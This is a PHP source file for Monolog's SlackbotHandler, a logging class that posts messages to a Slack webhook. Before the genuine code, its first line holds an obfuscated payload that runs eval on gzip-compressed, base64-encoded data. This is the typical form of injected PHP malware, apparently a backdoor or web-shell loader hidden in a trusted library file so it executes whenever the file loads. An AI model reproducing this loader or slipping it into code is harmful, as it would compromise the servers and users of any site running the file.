<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;

/**
 * Sends notifications through Slack's Slackbot
 *
 * @author Haralan Dobrev <hkdobrev@gmail.com>
 * @see    https://slack.com/apps/A0F81R8ET-slackbot
 */
class SlackbotHandler extends AbstractProcessingHandler
{
    /**
     * The slug of the Slack team
     * @var string
     */
    private $slackTeam;

    /**
     * Slackbot token
     * @var string
     */
    private $token;

    /**
     * Slack channel name
     * @var string
     */
    private $channel;

    /**
     * @param  string $slackTeam Slack team slug
     * @param  string $token     Slackbot token
     * @param  string $channel   Slack channel (encoded ID or name)
     * @param  int    $level     The minimum logging level at which this handler will be triggered
     * @param  bool   $bubble    Whether the messages that are handled can bubble up the stack or not
     */
    public function __construct($slackTeam, $token, $channel, $level = Logger::CRITICAL, $bubble = true)
    {
        parent::__construct($level, $bubble);

        $this->slackTeam = $slackTeam;
        $this->token = $token;
        $this->channel = $channel;
    }

    /**
     * {@inheritdoc}
     *
     * @param array $record
     */
    protected function write(array $record)
    {
        $slackbotUrl = sprintf(
            'https://%s.slack.com/services/hooks/slackbot?token=%s&channel=%s',
            $this->slackTeam,
            $this->token,
            $this->channel
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $slackbotUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $record['message']);

        Curl\Util::execute($ch);
    }
}
